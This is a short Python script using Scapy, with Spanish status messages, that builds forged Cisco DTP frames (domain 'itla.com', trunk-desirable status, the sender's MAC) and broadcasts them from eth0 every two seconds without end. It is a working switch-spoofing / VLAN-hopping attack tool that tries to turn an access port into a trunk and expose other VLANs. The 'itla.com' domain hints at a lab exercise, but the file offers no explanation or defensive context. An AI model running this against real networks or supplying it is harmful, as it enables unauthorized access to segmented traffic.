#!/usr/bin/env python3
from scapy.all import *

iface = "eth0"
src_mac = get_if_hwaddr(iface)
mac_bytes = bytes.fromhex(src_mac.replace(":", ""))

def build_tlv(tlv_type, value):
    length = 4 + len(value)
    return tlv_type.to_bytes(2,'big') + length.to_bytes(2,'big') + value

dtp_payload = (
    b'\x01' +
    build_tlv(0x0001, b'itla.com\x00') +   # +\x00 de padding
    build_tlv(0x0002, b'\x03') +
    build_tlv(0x0003, b'\x45') +
    build_tlv(0x0004, mac_bytes)
)

dst    = bytes.fromhex("01000ccccccc")
src    = bytes.fromhex(src_mac.replace(":",""))
llc    = bytes([0xaa, 0xaa, 0x03])
snap   = bytes([0x00, 0x00, 0x0c, 0x20, 0x04])
data   = llc + snap + dtp_payload
length = len(data).to_bytes(2, 'big')
frame  = dst + src + length + data
pad    = max(0, 60 - len(frame))
frame += b'\x00' * pad

print(f"[*] Enviando DTP hacia {iface}...")
sock = conf.L2socket(iface=iface)
i = 0
while True:
    sock.send(frame)
    i += 1
    print(f"\r[+] Enviados: {i}", end='', flush=True)
    time.sleep(2)

